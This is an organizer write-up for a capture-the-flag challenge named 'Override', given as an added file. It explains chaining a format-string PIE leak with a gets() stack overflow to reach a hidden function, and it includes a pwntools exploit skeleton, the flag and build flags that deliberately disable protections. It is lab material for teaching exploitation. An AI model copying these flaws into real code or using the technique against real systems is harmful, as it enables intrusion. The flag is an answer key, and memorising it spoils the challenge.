@@ -1,0 +1,426 @@
+IITCTF - OVERRIDE
+=================
+
+Category: Pwn
+Difficulty: Hard
+
+Flag:
+IITCTF{ch00s3_w1s3ly_pwn3r}
+
+Author:
+Created by AribZobair
+
+
+CHALLENGE SCENARIO
+------------------
+
+An experimental AI has entered containment mode.
+
+The emergency control terminal is still responding, but several
+interfaces are restricted.
+
+The player must navigate the AI interface, reach the protected
+memory console, identify the memory-safety issues, bypass PIE, and
+redirect execution into the hidden AI override function.
+
+
+1. NAVIGATE THE AI INTERFACE
+----------------------------
+
+Run:
+
+    ./pwnventure
+
+Choose:
+
+    [1] Access AI core
+
+Then choose either:
+
+    [1] Maintenance
+    [2] Network
+
+Both routes eventually reach the Control Center.
+
+At the Control Center, either option eventually reaches:
+
+    MEMORY CONSOLE
+
+The choices are deliberately simple. They provide the narrative
+navigation layer; they are not intended to be the main difficulty.
+
+
+2. CHECK BINARY PROTECTIONS
+---------------------------
+
+Run:
+
+    checksec --file=./pwnventure
+
+The intended build has:
+
+    No stack canary
+    NX enabled
+    PIE enabled
+
+The absence of a stack canary allows the final stack overflow to
+overwrite the saved return address.
+
+NX means shellcode on the stack is not the intended technique.
+
+PIE means code addresses are randomized at runtime, so an
+information leak is needed before using the address of the hidden
+override function.
+
+
+3. FIND THE FORMAT-STRING BUG
+-----------------------------
+
+The diagnostics interface asks for an identifier.
+
+The relevant code is:
+
+    printf("Diagnostic result: ");
+    printf(name);
+
+The second printf() treats the player's input as a format string.
+
+A safer version would have been:
+
+    printf("%s", name);
+
+Try inputs such as:
+
+    %p %p %p %p
+
+or positional format strings:
+
+    %1$p
+    %2$p
+    %3$p
+    ...
+
+The exact useful argument position depends on the compiled binary
+and runtime environment.
+
+
+4. LEAK A PIE ADDRESS
+---------------------
+
+The goal is to identify a leaked pointer belonging to the PIE
+executable.
+
+A typical PIE address on x86-64 Linux may resemble:
+
+    0x55xxxxxxxxxx
+
+Do not hardcode an example. Obtain the actual leak from the
+running challenge instance.
+
+Use Ghidra to identify which static function/offset corresponds
+to the leaked address.
+
+
+5. CALCULATE THE PIE BASE
+-------------------------
+
+Once a leaked runtime address belonging to a known PIE location has
+been identified:
+
+    PIE base =
+        leaked_runtime_address - known_static_offset
+
+Then calculate the runtime address of the hidden override function:
+
+    override_core_runtime =
+        PIE base + override_core_static_offset
+
+
+6. FIND THE MEMORY CORRUPTION
+-----------------------------
+
+The Memory Console contains:
+
+    char response[64];
+
+followed by:
+
+    gets(response);
+
+gets() performs no bounds checking.
+
+Therefore a sufficiently long input can overwrite data beyond the
+64-byte local buffer, including the saved return address.
+
+
+7. FIND THE RIP OFFSET
+----------------------
+
+Generate a cyclic pattern:
+
+    python3 -c 'from pwn import *; print(cyclic(200).decode())'
+
+Run the binary under GDB, reach the Memory Console, and provide the
+pattern.
+
+After the crash, determine the overwritten value and calculate its
+offset:
+
+    cyclic_find(value)
+
+Use the exact offset for the binary being exploited.
+
+
+8. FIND THE HIDDEN OVERRIDE FUNCTION
+-------------------------------------
+
+The binary contains a function that is not reached during normal
+execution:
+
+    override_core()
+
+It prints:
+
+    IITCTF{ch00s3_w1s3ly_pwn3r}
+
+Find it with Ghidra or:
+
+    nm -n ./pwnventure | grep override_core
+
+Because PIE is enabled, its runtime address must be calculated from
+the leaked PIE base.
+
+
+9. BUILD THE RET2WIN PAYLOAD
+----------------------------
+
+Conceptually:
+
+    payload = padding + override_core_runtime
+
+On x86-64:
+
+    payload = b"A" * RIP_OFFSET
+    payload += p64(override_core_runtime)
+
+A pwntools exploit skeleton is:
+
+    from pwn import *
+
+    elf = ELF("./pwnventure")
+    p = process("./pwnventure")
+
+    # Access AI core
+    p.sendlineafter(b"> ", b"1")
+
+    # Choose an interface
+    p.sendlineafter(b"> ", b"1")
+
+    # Continue through the control center
+    p.sendlineafter(b"> ", b"1")
+
+    # Send the final overflow payload
+    p.sendlineafter(b"> ", payload)
+
+The complete exploit must first obtain the PIE leak and calculate
+the runtime address of override_core().
+
+
+10. WHY TWO VULNERABILITIES ARE USED
+-------------------------------------
+
+The challenge intentionally chains two vulnerabilities.
+
+FORMAT STRING:
+
+    printf(name);
+
+Purpose:
+
+    INFORMATION DISCLOSURE
+
+It gives the player a way to recover a runtime address and defeat
+PIE.
+
+
+STACK OVERFLOW:
+
+    gets(response);
+
+Purpose:
+
+    CONTROL-FLOW HIJACKING
+
+It allows the player to overwrite the saved return address.
+
+
+The intended chain is:
+
+    Format string
+          |
+          v
+    PIE address leak
+          |
+          v
+    Calculate PIE base
+          |
+          v
+    Calculate override_core() runtime address
+          |
+          v
+    Stack buffer overflow
+          |
+          v
+    Overwrite saved RIP
+          |
+          v
+    Jump to override_core()
+          |
+          v
+    FLAG
+
+
+11. WHY A DIRECT RET2WIN IS NOT ENOUGH
+--------------------------------------
+
+PIE randomizes the executable's load address.
+
+Therefore the static address of override_core() cannot simply be
+used as the final runtime address.
+
+The format-string vulnerability supplies the information needed to
+calculate the PIE base.
+
+The player then combines that leak with the stack overflow.
+
+
+12. GET THE FLAG
+----------------
+
+When execution is redirected to:
+
+    override_core()
+
+the AI containment system is overridden and the function prints:
+
+    IITCTF{ch00s3_w1s3ly_pwn3r}
+
+The success screen also credits:
+
+    Created by AribZobair
+
+
+QUICK SOLVE SUMMARY
+-------------------
+
+    Access AI core
+        |
+        v
+    Explore interfaces
+        |
+        v
+    Reach diagnostics console
+        |
+        v
+    Test format strings
+        |
+        v
+    Leak PIE address
+        |
+        v
+    Calculate PIE base
+        |
+        v
+    Find override_core()
+        |
+        v
+    Reach memory console
+        |
+        v
+    Exploit gets()
+        |
+        v
+    Determine RIP offset
+        |
+        v
+    Build ret2win payload
+        |
+        v
+    Redirect RIP -> override_core()
+        |
+        v
+    IITCTF{ch00s3_w1s3ly_pwn3r}
+
+
+ORGANIZER BUILD
+---------------
+
+    chmod +x build.sh
+    ./build.sh
+
+Equivalent compilation:
+
+    gcc pwnventure.c -o pwnventure         -O0         -fno-stack-protector         -fPIE         -pie         -Wno-deprecated-declarations         -Wno-implicit-function-declaration         -D_GNU_SOURCE         -Wl,--undefined=gets
+
+The binary is intended for Linux x86-64.
+
+
+DEPLOYMENT
+----------
+
+Use a remote TCP service for this challenge.
+
+Distribute only:
+
+    pwnventure
+
+The server/container should execute the binary in an isolated
+environment.
+
+Do not expose the organizer's development machine directly.
+
+
+FINAL TESTING CHECKLIST
+-----------------------
+
+Before deployment, verify against the exact binary being hosted:
+
+    [ ] AI interface starts normally.
+    [ ] Both initial interface choices work.
+    [ ] Diagnostics console is reachable.
+    [ ] Format-string input is interpreted as a format string.
+    [ ] A reliable PIE leak can be obtained.
+    [ ] PIE base calculation is correct.
+    [ ] Memory Console is reachable.
+    [ ] gets() can overwrite the saved return address.
+    [ ] Exact RIP offset is known.
+    [ ] override_core() is reachable through the intended payload.
+    [ ] Flag is printed after successful exploitation.
+
+DESIGN INTENT
+-------------
+
+The choice system is intentionally retained from the original
+challenge.
+
+It now represents navigation through a compromised AI rather than
+a fantasy adventure.
+
+The choices provide:
+
+    - narrative
+    - exploration
+    - misdirection
+    - a memorable challenge identity
+
+They are not intended to be the primary difficulty.
+
+The hard portion remains:
+
+    information disclosure
+        +
+    PIE bypass
+        +
+    stack overflow
+        +
+    control-flow redirection
